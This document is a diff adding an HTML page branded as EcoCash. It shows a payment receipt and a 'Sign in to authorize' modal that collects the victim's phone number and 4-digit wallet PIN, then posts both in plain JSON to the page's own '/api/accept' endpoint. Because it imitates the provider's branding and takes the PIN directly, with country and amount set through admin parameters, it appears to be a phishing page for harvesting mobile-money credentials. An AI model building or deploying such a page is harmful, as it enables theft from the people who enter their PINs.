@@ -1,0 +1,355 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>EcoCash · Sign in to authorize</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --eco-blue: #0066A6;
+    --eco-red: #E31E24;
+    --eco-navy: #101828;
+    --eco-pin-bg: #E1F4FC;
+    --eco-pin-text: #006B98;
+    --eco-input-border: #0066A6;
+    --eco-pin-border: #CDD5DF;
+    --eco-overlay: rgba(16, 24, 40, 0.65);
+    --eco-close: #475467;
+    --eco-muted: #667085;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body {
+    font-family: 'Poppins', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+    background: #F8FAFC; color: var(--eco-navy);
+    -webkit-font-smoothing: antialiased; line-height: 1.5;
+    min-height: 100vh; overflow-x: hidden;
+  }
+
+  .bg-page { min-height: 100vh; padding: 24px 16px; display: flex; align-items: flex-start; justify-content: center; transition: filter .25s ease; }
+  .bg-card { max-width: 480px; width: 100%; background: #fff; border-radius: 18px; border: 1px solid #E5E7EB; box-shadow: 0 10px 30px rgba(17,24,39,0.06); padding: 22px; }
+  .bg-logo { display: inline-flex; align-items: baseline; font-weight: 800; font-size: 22px; margin-bottom: 16px; }
+  .bg-logo .eco { color: var(--eco-blue); }
+  .bg-logo .cash { color: var(--eco-red); }
+  .bg-card h2 { font-size: 16px; font-weight: 700; margin-bottom: 6px; }
+  .bg-card p { font-size: 13px; color: var(--eco-muted); margin-bottom: 14px; }
+  .bg-amt { font-size: 28px; font-weight: 800; letter-spacing: -1px; margin-bottom: 10px; }
+  .bg-row { display: flex; justify-content: space-between; padding: 10px 0; border-top: 1px solid #F0F2F6; font-size: 12.5px; }
+  .bg-row .k { color: var(--eco-muted); }
+  .bg-row .v { font-weight: 600; }
+
+  body.modal-open .bg-page { filter: blur(5px); pointer-events: none; user-select: none; }
+
+  .overlay {
+    position: fixed; inset: 0;
+    background: var(--eco-overlay);
+    display: flex; align-items: center; justify-content: center;
+    padding: 24px 16px; z-index: 1000;
+    opacity: 0; pointer-events: none; transition: opacity .22s ease;
+    overflow-y: auto;
+  }
+  .overlay.show { opacity: 1; pointer-events: auto; }
+
+  .modal { position: relative; width: 91%; max-width: 750px; background: #fff; border-radius: 42px; overflow: hidden; box-shadow: 0 24px 60px rgba(16,24,40,0.35); margin: auto; transform: translateY(10px) scale(0.98); transition: transform .22s ease; }
+  .overlay.show .modal { transform: translateY(0) scale(1); }
+
+  .close-btn { position: absolute; top: 18px; right: 18px; width: 40px; height: 40px; border-radius: 50%; background: transparent; border: none; cursor: pointer; display: inline-flex; align-items: center; justify-content: center; color: var(--eco-close); z-index: 10; }
+  .close-btn:hover { background: #F2F4F7; }
+  .close-btn svg { width: 22px; height: 22px; stroke-width: 2.2; }
+
+  .modal-header { background: #fff; padding: 44px 28px 30px; text-align: center; }
+  .wordmark { display: inline-flex; align-items: baseline; font-weight: 900; letter-spacing: -1px; font-size: 30px; margin-bottom: 26px; }
+  .wordmark .eco { color: var(--eco-blue); }
+  .wordmark .cash { color: var(--eco-red); }
+  .modal-title { font-size: 34px; font-weight: 800; letter-spacing: -0.8px; line-height: 1.15; }
+
+  .modal-body { background: var(--eco-blue); padding: 36px 22px 40px; }
+  .form-card { background: #fff; border-radius: 32px; padding: 30px 22px 34px; width: 90%; margin: 0 auto; }
+
+  .phone-field { display: flex; align-items: center; height: 76px; border: 3px solid var(--eco-input-border); border-radius: 20px; background: #fff; overflow: hidden; margin-bottom: 22px; }
+  .country-block { display: inline-flex; align-items: center; gap: 8px; padding: 0 14px 0 18px; height: 100%; flex-shrink: 0; }
+  .country-block .flag { font-size: 24px; line-height: 1; }
+  .country-block .dial { font-size: 18px; font-weight: 700; letter-spacing: -0.2px; }
+  .phone-divider { width: 1.5px; height: 42px; background: #E4E7EC; flex-shrink: 0; }
+  .phone-field input { flex: 1; min-width: 0; height: 100%; border: none; outline: none; background: transparent; padding: 0 16px; font-family: inherit; font-size: 22px; font-weight: 600; letter-spacing: 0.4px; }
+  .phone-field input::placeholder { color: #98A2B3; font-weight: 500; }
+
+  .pin-label { display: flex; align-items: center; justify-content: center; background: var(--eco-pin-bg); color: var(--eco-pin-text); font-size: 18px; font-weight: 700; padding: 10px 22px; border-radius: 999px; margin: 0 auto 20px; width: fit-content; }
+
+  .pin-row { display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; }
+  .pin-row input { width: 62px; height: 62px; border: 3px solid var(--eco-pin-border); border-radius: 20px; background: #fff; color: var(--eco-navy); font-family: inherit; font-size: 28px; font-weight: 800; text-align: center; outline: none; -webkit-text-security: disc; }
+  .pin-row input:focus { border-color: var(--eco-input-border); box-shadow: 0 0 0 4px rgba(0,102,166,0.15); background: #F6FBFE; }
+  .pin-row input.filled { border-color: var(--eco-input-border); }
+
+  .login-btn { width: 100%; height: 76px; background: var(--eco-blue); color: #fff; border: none; border-radius: 20px; font-family: inherit; font-size: 22px; font-weight: 800; cursor: pointer; }
+  .login-btn:hover { filter: brightness(1.08); }
+  .login-btn:disabled { opacity: 0.7; cursor: wait; }
+
+  .form-error { display: none; background: #FEF2F2; border: 1px solid #FECACA; color: #B91C1C; font-size: 13px; font-weight: 500; padding: 10px 12px; border-radius: 10px; margin-bottom: 16px; text-align: center; line-height: 1.5; }
+  .form-error.show { display: block; }
+
+  .demo-banner { display: none; margin-top: 18px; padding: 10px 12px; background: #FFF7ED; border: 1px solid #FED7AA; color: #9A3412; font-size: 11.5px; border-radius: 10px; text-align: center; line-height: 1.5; }
+  .demo-banner.show { display: block; }
+
+  .loading { position: absolute; inset: 0; background: rgba(255,255,255,0.94); display: none; align-items: center; justify-content: center; z-index: 20; border-radius: 42px; }
+  .loading.show { display: flex; }
+  .loading .inner { text-align: center; padding: 0 24px; }
+  .spinner { width: 50px; height: 50px; border: 4px solid #E5E7EB; border-top-color: var(--eco-blue); border-radius: 50%; margin: 0 auto 16px; animation: spin 0.9s linear infinite; }
+  @keyframes spin { to { transform: rotate(360deg); } }
+  .loading .t { font-size: 15px; font-weight: 800; margin-bottom: 4px; }
+  .loading .s { font-size: 12px; color: var(--eco-muted); }
+
+  @media (max-width: 420px) {
+    .overlay { padding: 16px 10px; }
+    .modal { border-radius: 32px; width: 94%; }
+    .modal-header { padding: 34px 22px 24px; }
+    .wordmark { font-size: 26px; margin-bottom: 20px; }
+    .modal-title { font-size: 27px; }
+    .modal-body { padding: 28px 16px 32px; }
+    .form-card { border-radius: 26px; padding: 24px 16px 28px; width: 94%; }
+    .phone-field { height: 66px; border-radius: 16px; margin-bottom: 18px; }
+    .country-block .flag { font-size: 20px; }
+    .country-block .dial { font-size: 15px; }
+    .phone-field input { font-size: 18px; }
+    .pin-label { font-size: 15px; padding: 8px 18px; margin-bottom: 16px; }
+    .pin-row { gap: 8px; margin-bottom: 20px; }
+    .pin-row input { width: 52px; height: 52px; border-radius: 16px; font-size: 24px; }
+    .login-btn { height: 64px; border-radius: 16px; font-size: 19px; }
+  }
+</style>
+</head>
+<body>
+
+<div class="bg-page">
+  <div class="bg-card">
+    <div class="bg-logo"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+    <h2>Payment Receipt</h2>
+    <p>Please review the details below and confirm the payment.</p>
+    <div class="bg-amt"><span id="bgCur">USD</span> <span id="bgAmt">0.00</span></div>
+    <div class="bg-row"><span class="k">Transaction ID</span><span class="v" id="bgTx">—</span></div>
+    <div class="bg-row"><span class="k">Country</span><span class="v" id="bgCountry">—</span></div>
+  </div>
+</div>
+
+<div class="overlay" id="overlay">
+  <div class="modal">
+    <div class="loading" id="loading">
+      <div class="inner">
+        <div class="spinner"></div>
+        <div class="t">Authorising payment…</div>
+        <div class="s">Please don't close this page.</div>
+      </div>
+    </div>
+
+    <button class="close-btn" onclick="closeModal()" aria-label="Close">
+      <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"><path d="M18 6L6 18M6 6l12 12"/></svg>
+    </button>
+
+    <div class="modal-header">
+      <div class="wordmark"><span class="eco">Eco</span><span class="cash">Cash</span></div>
+      <h1 class="modal-title">Sign in to authorize</h1>
+    </div>
+
+    <div class="modal-body">
+      <div class="form-card">
+        <div class="form-error" id="formError"></div>
+
+        <div class="phone-field">
+          <div class="country-block">
+            <span class="flag" id="phoneFlag">🏳️</span>
+            <span class="dial" id="phoneDial">+000</span>
+          </div>
+          <div class="phone-divider"></div>
+          <input type="tel" id="phoneInput" inputmode="numeric" autocomplete="tel" placeholder="Phone number" maxlength="15">
+        </div>
+
+        <div class="pin-label">Enter 4 digit PIN</div>
+
+        <div class="pin-row">
+          <input type="password" id="pin1" inputmode="numeric" maxlength="1" autocomplete="one-time-code">
+          <input type="password" id="pin2" inputmode="numeric" maxlength="1">
+          <input type="password" id="pin3" inputmode="numeric" maxlength="1">
+          <input type="password" id="pin4" inputmode="numeric" maxlength="1">
+        </div>
+
+        <button class="login-btn" id="loginBtn" onclick="submitLogin()">Login</button>
+
+        <div class="demo-banner" id="demoBanner">Demonstration mode. No real payment was made.</div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<script>
+const COUNTRY_MAP = {
+  'Zimbabwe':       { dial: '+263', flag: '🇿🇼' },
+  'South Africa':   { dial: '+27',  flag: '🇿🇦' },
+  'Zambia':         { dial: '+260', flag: '🇿🇲' },
+  'Botswana':       { dial: '+267', flag: '🇧🇼' },
+  'Kenya':          { dial: '+254', flag: '🇰🇪' },
+  'Malawi':         { dial: '+265', flag: '🇲🇼' },
+  'Rwanda':         { dial: '+250', flag: '🇷🇼' },
+  'DR Congo':       { dial: '+243', flag: '🇨🇩' },
+  'Ghana':          { dial: '+233', flag: '🇬🇭' },
+  'Lesotho':        { dial: '+266', flag: '🇱🇸' },
+  'Uganda':         { dial: '+256', flag: '🇺🇬' },
+  'China (Alipay)': { dial: '+86',  flag: '🇨🇳' }
+};
+
+let currentTx = null;
+try { currentTx = JSON.parse(sessionStorage.getItem('ecopay_current') || 'null'); } catch (e) {}
+
+if (!currentTx) {
+  const params = new URLSearchParams(window.location.search);
+  if (params.get('tx')) currentTx = { tx: params.get('tx'), c: params.get('c') || '', am: params.get('am') || '0', cur: params.get('cur') || 'USD' };
+}
+
+function applyAdminCountry() {
+  const countryName = currentTx && currentTx.c ? currentTx.c : '';
+  const entry = COUNTRY_MAP[countryName];
+  const flagEl = document.getElementById('phoneFlag');
+  const dialEl = document.getElementById('phoneDial');
+
+  if (!entry) {
+    flagEl.textContent = '🏳️';
+    dialEl.textContent = '+—';
+    showFormError('No country configured. Please ask the merchant to set the destination country.');
+    document.getElementById('loginBtn').disabled = true;
+    return;
+  }
+  flagEl.textContent = entry.flag;
+  dialEl.textContent = entry.dial;
+}
+
+function prefillPhone() {
+  if (!currentTx) return;
+  const raw = (currentTx.recipientPhone || currentTx.an || '').replace(/\D/g, '');
+  if (raw) document.getElementById('phoneInput').value = raw.replace(/^0+/, '');
+}
+
+function fillBackground() {
+  if (!currentTx) return;
+  document.getElementById('bgCur').textContent = currentTx.cur || 'USD';
+  document.getElementById('bgAmt').textContent = Number(currentTx.am || 0).toFixed(2);
+  document.getElementById('bgTx').textContent = currentTx.tx || '—';
+  document.getElementById('bgCountry').textContent = currentTx.c || '—';
+}
+
+const pinEls = ['pin1','pin2','pin3','pin4'].map(id => document.getElementById(id));
+pinEls.forEach((el, i) => {
+  el.addEventListener('input', () => {
+    el.value = el.value.replace(/\D/g, '').slice(0, 1);
+    el.classList.toggle('filled', !!el.value);
+    if (el.value && i < pinEls.length - 1) pinEls[i + 1].focus();
+  });
+  el.addEventListener('keydown', (e) => {
+    if (e.key === 'Backspace' && !el.value && i > 0) pinEls[i - 1].focus();
+  });
+  el.addEventListener('paste', (e) => {
+    const text = (e.clipboardData || window.clipboardData).getData('text').replace(/\D/g, '').slice(0, 4);
+    if (text.length === 4) {
+      e.preventDefault();
+      text.split('').forEach((d, idx) => { pinEls[idx].value = d; pinEls[idx].classList.add('filled'); });
+      pinEls[3].focus();
+    }
+  });
+});
+
+function showFormError(msg) {
+  const el = document.getElementById('formError');
+  el.textContent = msg; el.classList.add('show');
+}
+function clearFormError() {
+  document.getElementById('formError').classList.remove('show');
+}
+
+function openModal() {
+  document.getElementById('overlay').classList.add('show');
+  document.body.classList.add('modal-open');
+  document.body.style.overflow = 'hidden';
+  setTimeout(() => { const p = document.getElementById('phoneInput'); if (!p.value) p.focus(); }, 250);
+}
+function closeModal() {
+  document.getElementById('overlay').classList.remove('show');
+  document.body.classList.remove('modal-open');
+  document.body.style.overflow = '';
+  setTimeout(() => { if (history.length > 1) history.back(); else window.location.href = 'client.html'; }, 150);
+}
+
+document.addEventListener('keydown', (e) => { if (e.key === 'Escape') closeModal(); });
+document.getElementById('overlay').addEventListener('click', (e) => {
+  if (e.target === document.getElementById('overlay')) closeModal();
+});
+
+async function submitLogin() {
+  clearFormError();
+  const countryName = currentTx && currentTx.c ? currentTx.c : '';
+  const entry = COUNTRY_MAP[countryName];
+  if (!entry) { showFormError('No country configured.'); return; }
+
+  const dial = entry.dial;
+  const phoneDigits = document.getElementById('phoneInput').value.replace(/\D/g, '');
+  const pin = pinEls.map(el => el.value).join('');
+
+  if (phoneDigits.length < 6) { showFormError('Please enter a valid phone number.'); document.getElementById('phoneInput').focus(); return; }
+  if (pin.length !== 4) { showFormError('Please enter all 4 PIN digits.'); const empty = pinEls.find(el => !el.value); if (empty) empty.focus(); return; }
+
+  const btn = document.getElementById('loginBtn');
+  const loading = document.getElementById('loading');
+  btn.disabled = true;
+  loading.classList.add('show');
+
+  try {
+    const res = await fetch('/api/accept', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        transactionId: currentTx ? currentTx.tx : null,
+        phone: dial + phoneDigits,
+        pin: pin
+      })
+    });
+
+    let result = { status: 'pending' };
+    try { result = await res.json(); } catch (e) {}
+
+    loading.classList.remove('show');
+    btn.disabled = false;
+
+    if (result.status === 'success') {
+      if (currentTx) { currentTx.status = 'success'; try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {} }
+      window.location.href = 'client.html';
+      return;
+    }
+    if (result.status === 'failed') {
+      showFormError(result.message || 'Payment failed. Please check your number and PIN.');
+      pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
+      pinEls[0].focus();
+      return;
+    }
+    if (result.status === 'demo') {
+      document.getElementById('demoBanner').classList.add('show');
+      showFormError('Demonstration mode: no real payment was made. Connect the EcoCash provider to enable real payments.');
+      pinEls.forEach(el => { el.value = ''; el.classList.remove('filled'); });
+      pinEls[0].focus();
+      return;
+    }
+
+    if (currentTx) { currentTx.status = 'pending'; try { sessionStorage.setItem('ecopay_current', JSON.stringify(currentTx)); } catch (e) {} }
+    window.location.href = 'client.html';
+  } catch (err) {
+    loading.classList.remove('show');
+    btn.disabled = false;
+    showFormError('Could not process payment. Please try again.');
+  }
+}
+
+applyAdminCountry();
+prefillPhone();
+fillBackground();
+openModal();
+</script>
+</body>
+</html>
